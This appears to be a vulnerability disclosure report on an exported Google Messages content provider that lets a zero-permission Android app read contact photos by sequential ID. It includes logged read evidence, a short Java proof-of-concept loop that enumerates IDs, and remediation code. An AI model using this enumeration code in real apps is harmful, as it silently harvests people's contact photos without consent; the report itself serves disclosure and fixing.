# Google Messages AvatarContentProvider — Contact Photo Disclosure Without READ_CONTACTS

## Summary

A zero-permission malicious app can read contact photos from Google Messages via the exported `AvatarContentProvider` using sequential numeric IDs. This bypasses the `READ_CONTACTS` permission requirement, allowing silent enumeration and exfiltration of contact photos.

## Vulnerability Details

| Field | Value |
|-------|-------|
| **Affected App** | Google Messages (com.google.android.apps.messaging) |
| **Version** | messages.android_20260622_01_RC00.phone_dynamic |
| **Component** | `com.google.android.apps.messaging.shared.ui.avatar.AvatarContentProvider` |
| **Severity** | MEDIUM (CVSS 5.5) |
| **CWE** | CWE-862 (Missing Authorization), CWE-200 (Exposure of Sensitive Information) |
| **MITRE ATT&CK** | T1005 (Data from Local System) |
| **User Interaction** | None |
| **Permissions Required** | None |
| **Device** | Pixel 6a, Android 17, Security Patch 2026-06-05 |

## Root Cause

The `AvatarContentProvider` is exported and serves contact photos via `openFile()` without verifying the caller holds `READ_CONTACTS` permission. Contact photos are addressable via sequential numeric IDs, making enumeration trivial.

## Evidence

```
App context: UID 10340, Package: com.vrppoc, ZERO permissions

[VULN] Avatar read 512 bytes: content://...AvatarContentProvider/contact_photo/1
  Hex: 89504e470d0a1a0a0000000d49484452000000bd000000bd0806000000e6d77c
       (PNG header: 189x189 pixel RGBA image)

[VULN] Avatar read 512 bytes: content://...AvatarContentProvider/contact_photo/2
  Hex: 89504e470d0a1a0a0000000d49484452000000bd000000bd0806000000e6d77c

[VULN] Avatar read 512 bytes: content://...AvatarContentProvider/avatar/1
  Hex: 89504e470d0a1a0a0000000d49484452000000bd000000bd0806000000e6d77c
```

All three reads return valid PNG images (89504e47 = PNG magic bytes, IHDR chunk shows 189x189 RGBA).

## PoC Code

```java
ContentResolver cr = getContentResolver();
for (int id = 1; id <= 100; id++) {
    Uri uri = Uri.parse("content://com.google.android.apps.messaging" +
        ".shared.ui.avatar.AvatarContentProvider/contact_photo/" + id);
    try {
        InputStream is = cr.openInputStream(uri);
        if (is != null) {
            // Contact photo successfully read without READ_CONTACTS
            byte[] photo = readAll(is);
            is.close();
        }
    } catch (FileNotFoundException e) {
        // No photo for this ID — move to next
    }
}
```

## Remediation

Add caller permission verification in `openFile()`:
```java
if (getContext().checkCallingPermission("android.permission.READ_CONTACTS")
    != PackageManager.PERMISSION_GRANTED) {
    throw new SecurityException("Caller must hold READ_CONTACTS");
}
```

Or set `android:readPermission="android.permission.READ_CONTACTS"` on the provider declaration.
